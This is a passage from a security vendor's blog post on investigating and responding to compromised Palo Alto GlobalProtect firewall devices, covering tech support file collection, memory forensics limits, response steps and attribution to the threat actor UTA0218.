<h3>GlobalProtect Firewall Device Log Analysis</h3>
<p style="font-weight: 400;">During Volexity’s incident response investigations, the affected customers were able to generate a tech support file from the compromised firewall devices. This tech support file is an archive that contains files Palo Alto Networks tech support can use to troubleshoot issues organizations are having with their firewall devices. It also contains logs Volexity noted as having key forensic artifacts and could potentially help determine if a device is compromised.</p>
<p style="font-weight: 400;">To generate a tech support file, Palo Alto GlobalProtect system administrators can navigate within the WebGUI to the Device tab, or if in Panorama to the Panorama tab. From here, navigate to the “Support” page and look under the Tech Support File section for "Generate Tech Support File.” Clicking this will generate a tech support file that can be downloaded by selecting “Download Tech Support File” when it becomes available. This may also be done via the command-line interface using one of two commands:</p>
<ul>
<li><code>tftp export tech-support to &lt;tftp host&gt;</code></li>
<li><code>scp export tech-support to &lt;username@host:path&gt;</code></li>
</ul>
<p style="font-weight: 400;">More information on this process from Palo Alto Networks can be found <a href="https://knowledgebase.paloaltonetworks.com/KCSArticleDetail?id=kA10g000000ClRlCAKvat">here</a>.</p>
<h3>Volatile Memory Collection</h3>
<p>Collecting volatile memory from potentially compromised devices requires assistance from Palo Alto Networks technical support. It is not currently possible for Palo Alto Networks customers to collect memory on their own. Due to these collection challenges, Volexity products currently do not officially support Palo Alto Networks firewall devices.</p>
<h3>Volatile Memory Analysis with<strong> Volexity Volcano</strong></h3>
<p>Volexity regularly leverages memory forensics when investigating or confirming compromises. Due to the sensitive nature of the artifacts in memory and the pending coordination efforts with Palo Alto Networks, Volexity will share more details of this analysis with <a href="https://www.volexity.com/products-overview/volcano/">Volexity Volcano</a> in a future update.</p>
<h2><a id="RespondingToCompromise"></a>Responding to Compromise</h2>
<p style="font-weight: 400;">If you discover that your Palo Alto Network GlobalProtect firewall device is compromised, it is important to take immediate action. Make sure to not wipe or rebuild the appliance. Collecting logs, generating a tech support file, and preserving forensics artifacts (memory and disk) from the device are crucial.</p>
<p style="font-weight: 400;">Pivoting to analyzing internal systems and tracking potential lateral movement should be done as soon as possible. Further, any credentials, secrets, or other sensitive data that may have been stored on the GlobalProtect firewall device should be considered compromised. This may warrant password resets, changing of secrets, and additional investigations.</p>
<p style="font-weight: 400;">Volexity strongly recommends that organizations look for signs of lateral movement internally from their Palo Alto Networks GlobalProtect firewall device that is not consistent with expected behavior. Proactive checks of any externally facing infrastructure may also be warranted if internal visibility is limited.</p>
<p style="font-weight: 400;">If you need assistance validating or responding to a breach, please feel free to contact Volexity for <a href="https://www.volexity.com/company/contact/breach-assistance/">breach assistance</a>.</p>
<h2>Conclusion</h2>
<p style="font-weight: 400;">Targeting edge devices remains a popular vector of attack for capable threat actors who have the time and resources to invest into researching new vulnerabilities. Having a robust detection stack is critical in identifying activity related to exploits, inclusive of network monitoring and EDR capabilities to identify lateral movement. Early detection of intrusions greatly reduces the scope and costs associated to mitigation.</p>
<p style="font-weight: 400;">Volexity tracks activity described in this blog post under the moniker UTA0218. At the time of writing, Volexity was unable to link the activity to other threat activity. Volexity assesses that it is highly likely UTA0218 is a state-backed threat actor based on the resources required to develop and exploit a vulnerability of this nature, the type of victims targeted by this actor, and the capabilities displayed to install the Python backdoor and further access victim networks.</p>
<p style="font-weight: 400;">As with previous public disclosures of vulnerabilities in these kinds of devices, Volexity assesses that it is likely a spike in exploitation will be observed over the next few days by UTA0218 and potentially other threat actors who may develop exploits for this vulnerability. This spike in activity will be driven by the urgency of this window of access closing due to mitigations and patches being deployed. It is therefore imperative that organizations act quickly to deploy recommended mitigations and perform compromise reviews of their devices to check whether further internal investigation of their networks is required.</p>
<p style="font-weight: 400;">This blog post provided guidance on prevention and detection; related indicators can also be downloaded from the Volexity GitHub page:</p>
<ul>
<li><a href="https://github.com/volexity/threat-intel/blob/main/2024/2024-04-12%20Palo%20Alto%20Networks%20GlobalProtect/indicators/rules.yar">YARA rules</a></li>
<li><a href="https://github.com/volexity/threat-intel/blob/main/2024/2024-04-12%20Palo%20Alto%20Networks%20GlobalProtect/indicators/iocs.csv">Single value indicators</a></li>
</ul>
<blockquote><p>For more information about Volexity's <a href="https://www.volexity.com/services-overview/network-security-monitoring/">Network Security Monitoring</a> service or Volexity's leading memory analysis product,<a href="https://www.volexity.com/products-overview/volcano/"> Volexity Volcano</a>, please do not hesitate to <a class="fui-Link ___m14voj0 f3rmtva f1ern45e f1deefiw f1n71otn f1q5o8ev f1h8hb77 f1vxd6vx f1ewtqcl fyind8e f1k6fduh f1w7gpdv fk6fouc fjoy568 figsok6 f1hu3pq6 f11qmguv f19f4twv f1tyq0we f1g0x7ka fhxju0i f1qch9an f1cnd47f fqv5qza f1vmzxwi f1o700av f13mvf36 f9n3di6 f1ids18y fygtlnl f1deo86v f12x56k7 f1iescvh ftqa4ok f50u1b5 fs3pq8b f1hghxdh f1tymzes f1x7u7e9 f1cmlufx f10aw75t fsle3fq" tabindex="-1" title="https://www.volexity.com/company/contact/" href="https://www.volexity.com/company/contact/" target="_blank" rel="noopener noreferrer" aria-label="Link contact us">contact us</a>.</p></blockquote>
				<div class="post-tags">
					<a href="https://www.volexity.com/blog/tag/0day/">0day</a>, <a href="https://www.volexity.com/blog/tag/apt/">APT</a>, <a href="https://www.volexity.com/blog/tag/exploit/">Exploit</a>, <a href="https://www.volexity.com/blog/tag/firewall/">firewall</a>, <a href="https://www.volexity.com/blog/tag/global-protect/">Global Protect</a>, <a href="https://www.volexity.com/blog/tag/palo-alto-networks/">Palo Alto Networks</a>, <a href="https://www.volexity.com/blog/tag/rce/">RCE</a>, <a href="https://www.volexity.com/blog/tag/zero-day/">zero-day</a>				</div>
			</div>

		</article>

		<aside class="sidebar col-sm-4">
	<ul class="widgets">
		<li class="widget widget_search"><div class="widget-content"><form role="search" method="get" class="search-form" action="https://www.volexity.com/">
    <label>
        <span class="screen-reader-text">Search for:</span>
        <input type="search" class="search-field"
               placeholder="SEARCH"
               value="" name="s"
               title="Search for:" />
    </label>
    <input type="submit" class="search-submit"
           value="Search" />
</form></div></li>
		<li class="widget widget_recent_entries"><div class="widget-content">
		<h4 class="widget-title">Recent Posts</h4>
		<ul>
											<li>
					<a href="https://www.volexity.com/blog/2024/11/22/the-nearest-neighbor-attack-how-a-russian-apt-weaponized-nearby-wi-fi-networks-for-covert-access/">The Nearest Neighbor Attack: How A Russian APT Weaponized Nearby Wi-Fi Networks for Covert Access</a>
									</li>
											<li>
					<a href="https://www.volexity.com/blog/2024/11/15/brazenbamboo-weaponizes-forticlient-vulnerability-to-steal-vpn-credentials-via-deepdata/">BrazenBamboo Weaponizes FortiClient Vulnerability to Steal VPN Credentials via DEEPDATA</a>
									</li>
											<li>
					<a href="https://www.volexity.com/blog/2024/08/02/stormbamboo-compromises-isp-to-abuse-insecure-software-update-mechanisms/">StormBamboo Compromises ISP to Abuse Insecure Software Update Mechanisms</a>
									</li>
											<li>
					<a href="https://www.volexity.com/blog/2024/06/13/disgomoji-malware-used-to-target-indian-government/">DISGOMOJI Malware Used to Target Indian Government</a>
									</li>
											<li>
					<a href="https://www.volexity.com/blog/2024/05/15/detecting-compromise-of-cve-2024-3400-on-palo-alto-networks-globalprotect-devices/">Detecting Compromise of CVE-2024-3400 on Palo Alto Networks GlobalProtect Devices</a>
									</li>
					</ul>

		</div></li><li class="widget widget_archive"><div class="widget-content"><h4 class="widget-title">Archives</h4>
			<ul>
					<li><a href='https://www.volexity.com/blog/2024/11/'>November 2024</a></li>
	<li><a href='https://www.volexity.com/blog/2024/08/'>August 2024</a></li>
	<li><a href='https://www.volexity.com/blog/2024/06/'>June 2024</a></li>
	<li><a href='https://www.volexity.com/blog/2024/05/'>May 2024</a></li>
	<li><a href='https://www.volexity.com/blog/2024/04/'>April 2024</a></li>
	<li><a href='https://www.volexity.com/blog/2024/02/'>February 2024</a></li>
	<li><a href='https://www.volexity.com/blog/2024/01/'>January 2024</a></li>
	<li><a href='https://www.volexity.com/blog/2023/09/'>September 2023</a></li>
	<li><a href='https://www.volexity.com/blog/2023/06/'>June 2023</a></li>
	<li><a href='https://www.volexity.com/blog/2023/03/'>March 2023</a></li>
	<li><a href='https://www.volexity.com/blog/2022/12/'>December 2022</a></li>
	<li><a href='https://www.volexity.com/blog/2022/08/'>August 2022</a></li>
	<li><a href='https://www.volexity.com/blog/2022/07/'>July 2022</a></li>
	<li><a href='https://www.volexity.com/blog/2022/06/'>June 2022</a></li>
	<li><a href='https://www.volexity.com/blog/2022/03/'>March 2022</a></li>
	<li><a href='https://www.volexity.com/blog/2022/02/'>February 2022</a></li>
	<li><a href='https://www.volexity.com/blog/2021/12/'>December 2021</a></li>
	<li><a href='https://www.volexity.com/blog/2021/08/'>August 2021</a></li>
	<li><a href='https://www.volexity.com/blog/2021/05/'>May 2021</a></li>
	<li><a href='https://www.volexity.com/blog/2021/03/'>March 2021</a></li>
	<li><a href='https://www.volexity.com/blog/2020/12/'>December 2020</a></li>
	<li><a href='https://www.volexity.com/blog/2020/11/'>November 2020</a></li>
	<li><a href='https://www.volexity.com/blog/2020/04/'>April 2020</a></li>
	<li><a href='https://www.volexity.com/blog/2020/03/'>March 2020</a></li>
	<li><a href='https://www.volexity.com/blog/2019/09/'>September 2019</a></li>
	<li><a href='https://www.volexity.com/blog/2018/11/'>November 2018</a></li>
	<li><a href='https://www.volexity.com/blog/2018/09/'>September 2018</a></li>
	<li><a href='https://www.volexity.com/blog/2018/08/'>August 2018</a></li>
	<li><a href='https://www.volexity.com/blog/2018/07/'>July 2018</a></li>
	<li><a href='https://www.volexity.com/blog/2018/06/'>June 2018</a></li>
	<li><a href='https://www.volexity.com/blog/2018/04/'>April 2018</a></li>
	<li><a href='https://www.volexity.com/blog/2017/11/'>November 2017</a></li>
	<li><a href='https://www.volexity.com/blog/2017/07/'>July 2017</a></li>
	<li><a href='https://www.volexity.com/blog/2017/03/'>March 2017</a></li>
	<li><a href='https://www.volexity.com/blog/2016/11/'>November 2016</a></li>
	<li><a href='https://www.volexity.com/blog/2015/10/'>October 2015</a></li>
	<li><a href='https://www.volexity.com/blog/2015/07/'>July 2015</a></li>
	<li><a href='https://www.volexity.com/blog/2015/06/'>June 2015</a></li>
	<li><a href='https://www.volexity.com/blog/2015/04/'>April 2015</a></li>
	<li><a href='https://www.volexity.com/blog/2014/10/'>October 2014</a></li>
	<li><a href='https://www.volexity.com/blog/2014/09/'>September 2014</a></li>
			</ul>

			</div></li><li class="widget widget_categorizedtagcloudwidget"><div class="widget-content"><h4 class="widget-title">Tags</h4>
    <div id="categorized-tag-cloud"><span id="categorized-tag-cloud-el-1"><a href="https://www.volexity.com/blog/tag/exploits/" class="tag-cloud-link tag-link-33 tag-link-position-1" style="font-size: 15.151515151515pt;" aria-label="exploits (12 items)">exploits</a></span> <span id="categorized-tag-cloud-el-2"><a href="https://www.volexity.com/blog/tag/dfir/" class="tag-cloud-link tag-link-133 tag-link-position-2" style="font-size: 10pt;" aria-label="dfir (3 items)">dfir</a></span> <span id="categorized-tag-cloud-el-3"><a href="https://www.volexity.com/blog/tag/threat-intelligence/" class="tag-cloud-link tag-link-93 tag-link-position-3" style="font-size: 12.525252525253pt;" aria-label="Threat Intelligence (6 items)">Threat Intelligence</a></span> <span id="categorized-tag-cloud-el-4"><a href="https://www.volexity.com/blog/tag/north-korea/" class="tag-cloud-link tag-link-117 tag-link-position-4" style="font-size: 11.818181818182pt;" aria-label="North Korea (5 items)">North Korea</a></span> <span id="categorized-tag-cloud-el-5"><a href="https://www.volexity.com/blog/tag/vulnerabilities/" class="tag-cloud-link tag-link-34 tag-link-position-5" style="font-size: 11.010101010101pt;" aria-label="vulnerabilities (4 items)">vulnerabilities</a></span> <span id="categorized-tag-cloud-el-6"><a href="https://www.volexity.com/blog/tag/spear-phishing/" class="tag-cloud-link tag-link-45 tag-link-position-6" style="font-size: 11.010101010101pt;" aria-label="spear phishing (4 items)">spear phishing</a></span> <span id="categorized-tag-cloud-el-7"><a href="https://www.volexity.com/blog/tag/ivanti-connect-secure/" class="tag-cloud-link tag-link-173 tag-link-position-7" style="font-size: 11.010101010101pt;" aria-label="ivanti connect secure (4 items)">ivanti connect secure</a></span> <span id="categorized-tag-cloud-el-8"><a href="https://www.volexity.com/blog/tag/vpn/" class="tag-cloud-link tag-link-24 tag-link-position-8" style="font-size: 11.818181818182pt;" aria-label="VPN (5 items)">VPN</a></span> <span id="categorized-tag-cloud-el-9"><a href="https://www.volexity.com/blog/tag/memory-forensics/" class="tag-cloud-link tag-link-65 tag-link-position-9" style="font-size: 11.818181818182pt;" aria-label="memory forensics (5 items)">memory forensics</a></span> <span id="categorized-tag-cloud-el-10"><a href="https://www.volexity.com/blog/tag/malware/" class="tag-cloud-link tag-link-106 tag-link-position-10" style="font-size: 11.818181818182pt;" aria-label="malware (5 items)">malware</a></span> <span id="categorized-tag-cloud-el-11"><a href="https://www.volexity.com/blog/tag/0day/" class="tag-cloud-link tag-link-131 tag-link-position-11" style="font-size: 11.818181818182pt;" aria-label="0day (5 items)">0day</a></span> <span id="categorized-tag-cloud-el-12"><a href="https://www.volexity.com/blog/tag/webshell/" class="tag-cloud-link tag-link-84 tag-link-position-12" style="font-size: 11.818181818182pt;" aria-label="webshell (5 items)">webshell</a></span> <span id="categorized-tag-cloud-el-13"><a href="https://www.volexity.com/blog/tag/pulsesecure/" class="tag-cloud-link tag-link-172 tag-link-position-13" style="font-size: 11.010101010101pt;" aria-label="pulsesecure (4 items)">pulsesecure</a></span> <span id="categorized-tag-cloud-el-14"><a href="https://www.volexity.com/blog/tag/volcano/" class="tag-cloud-link tag-link-148 tag-link-position-14" style="font-size: 10pt;" aria-label="volcano (3 items)">volcano</a></span> <span id="categorized-tag-cloud-el-15"><a href="https://www.volexity.com/blog/tag/scanning/" class="tag-cloud-link tag-link-31 tag-link-position-15" style="font-size: 11.010101010101pt;" aria-label="Scanning (4 items)">Scanning</a></span> <span id="categorized-tag-cloud-el-16"><a href="https://www.volexity.com/blog/tag/phishing/" class="tag-cloud-link tag-link-107 tag-link-position-16" style="font-size: 10pt;" aria-label="phishing (3 items)">phishing</a></span> <span id="categorized-tag-cloud-el-17"><a href="https://www.volexity.com/blog/tag/apt/" class="tag-cloud-link tag-link-35 tag-link-position-17" style="font-size: 20pt;" aria-label="APT (38 items)">APT</a></span> <span id="categorized-tag-cloud-el-18"><a href="https://www.volexity.com/blog/tag/exploit/" class="tag-cloud-link tag-link-87 tag-link-position-18" style="font-size: 15.555555555556pt;" aria-label="Exploit (13 items)">Exploit</a></span> <span id="categorized-tag-cloud-el-19"><a href="https://www.volexity.com/blog/tag/rce/" class="tag-cloud-link tag-link-174 tag-link-position-19" style="font-size: 12.525252525253pt;" aria-label="RCE (6 items)">RCE</a></span> <span id="categorized-tag-cloud-el-20"><a href="https://www.volexity.com/blog/tag/china/" class="tag-cloud-link tag-link-42 tag-link-position-20" style="font-size: 14.444444444444pt;" aria-label="China (10 items)">China</a></span> </div>
  	<style>
  	
  		#categorized-tag-cloud a, #categorized-tag-cloud a:visited { text-decoration:none; }
      #categorized-tag-cloud a:hover { text-decoration:none; color:#3b97d3; }
    		#categorized-tag-cloud-el-1 a, #categorized-tag-cloud-el-1 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-2 a, #categorized-tag-cloud-el-2 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-3 a, #categorized-tag-cloud-el-3 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-4 a, #categorized-tag-cloud-el-4 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-5 a, #categorized-tag-cloud-el-5 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-6 a, #categorized-tag-cloud-el-6 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-7 a, #categorized-tag-cloud-el-7 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-8 a, #categorized-tag-cloud-el-8 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-9 a, #categorized-tag-cloud-el-9 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-10 a, #categorized-tag-cloud-el-10 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-11 a, #categorized-tag-cloud-el-11 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-12 a, #categorized-tag-cloud-el-12 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-13 a, #categorized-tag-cloud-el-13 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-14 a, #categorized-tag-cloud-el-14 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-15 a, #categorized-tag-cloud-el-15 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-16 a, #categorized-tag-cloud-el-16 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-17 a, #categorized-tag-cloud-el-17 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-18 a, #categorized-tag-cloud-el-18 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-19 a, #categorized-tag-cloud-el-19 a:visited { color:#555555; }
    		#categorized-tag-cloud-el-20 a, #categorized-tag-cloud-el-20 a:visited { color:#555555; }
  	</style></div></li>	</ul>
</aside>	</section>
</div>	</main>

	<footer class="footer">
	<div class="footer-container container">
        <div class="footer-col-first col-md-3 no-padding">
            <a class="footer-logo" href="https://www.volexity.com"><img src="https://www.volexity.com/wp-content/themes/volexity/dist/images/logo.png" alt="Volexity"></a>
            <address class="footer-copyright">&copy; 2025 Volexity. All Rights Reserved.</address>
        </div>
		<ul id="menu-footer-menu" class="footer-menu-list col-md-4 col-xs-12"><li id="menu-item-57" class="nav-header menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-57"><a href="/company/about/">About</a>
<ul class="sub-menu">
	<li id="menu-item-59" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-59"><a href="https://www.volexity.com/company/about/">About Us</a></li>
	<li id="menu-item-58" class="menu-item menu-item-type-post_type menu-item-object-page current_page_parent menu-item-58"><a href="https://www.volexity.com/blog/">Blog</a></li>
	<li id="menu-item-395" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-395"><a href="https://www.volexity.com/privacy-policy/">Privacy Policy</a></li>
</ul>
</li>
<li id="menu-item-60" class="nav-header menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-60"><a href="/solutions/">Solutions</a>
<ul class="sub-menu">
	<li id="menu-item-400" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-400"><a href="https://www.volexity.com/company/contact/">Request A Demo</a></li>
	<li id="menu-item-61" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-61"><a href="https://www.volexity.com/products-overview/">Products</a></li>
	<li id="menu-item-669" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-669"><a href="https://www.volexity.com/services-overview/">Services</a></li>
</ul>
</li>
</ul>
        <div class="footer-address col-md-3 col-xs-12">
            <p class="footer-header">Contact</p>
            <ul>
                <li class="footer-address--address icon-location-marker">
                    11654 Plaza America Dr #774<br />
                    Reston, VA 20190-4700                </li>
                <li class="footer-address--phone icon-phone-mobile">1-888-825-1975</li>
            </ul>
        </div>
        <div class="footer-social col-md-2 no-padding">
            <p class="footer-header">Connect</p>
            <ul>
                <li class="footer-social-holder"><a href="https://www.facebook.com/volexity" target="_blank" class="icon-facebook footer-social--link"></a></li>
                <li class="footer-social-holder"><a href="https://twitter.com/volexity" target="_blank" class="icon-twitter footer-social--link"></a></li>
                <li class="footer-social-holder"><a href="https://www.linkedin.com/company/volexity" target="_blank" class="icon-linkedin footer-social--link"></a></li>
                <li class="footer-social-holder"><a href="https://infosec.exchange/@volexity" target="_blank" class="fa-mastodon footer-social--link"></a></li>
            </ul>
        </div>
	</div>
    <div id="back-to-top" class="icon-slide-left"></div>
	<script type="text/javascript" id="main-js-extra">
/* <![CDATA[ */
var urls = {"base":"https:\/\/www.volexity.com","theme":"https:\/\/www.volexity.com\/wp-content\/themes\/volexity","ajax":"https:\/\/www.volexity.com\/wp-admin\/admin-ajax.php"};
var info = [];
/* ]]> */
</script>
<script type="text/javascript" src="https://www.volexity.com/wp-content/themes/volexity/dist/scripts/scripts.min.js?ver=6.7" id="main-js"></script>
<script type="text/javascript" src="https://www.volexity.com/wp-includes/js/comment-reply.min.js?ver=6.7" id="comment-reply-js" async="async" data-wp-strategy="async"></script>

		<!-- Cookie Notice plugin v2.4.18 by Hu-manity.co https://hu-manity.co/ -->
		<div id="cookie-notice" role="dialog" class="cookie-notice-hidden cookie-revoke-hidden cn-position-bottom" aria-label="Cookie Notice" style="background-color: rgba(0,0,0,1);"><div class="cookie-notice-container" style="color: #fff"><span id="cn-notice-text" class="cn-text-container">This Website uses cookies, which are necessary to its functioning and required to achieve the purposes illustrated in our <a href="/privacy-policy/#cookies">Cookie Policy</a>. By clicking the button, you consent to our use of cookies.</span><span id="cn-notice-buttons" class="cn-buttons-container"><a href="#" id="cn-accept-cookie" data-cookie-set="accept" class="cn-set-cookie cn-button cn-button-custom box-cta" aria-label="Agree &amp; Close">Agree &amp; Close</a></span><span id="cn-close-notice" data-cookie-set="accept" class="cn-close-icon" title="No"></span></div>
			
		</div>
		<!-- / Cookie Notice plugin --></footer><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"9002c11e2b07653f","version":"2024.10.5","serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"token":"a029113bf02e4450b5192c2ec2fd2700","b":1}' crossorigin="anonymous"></script>
</body>
</html>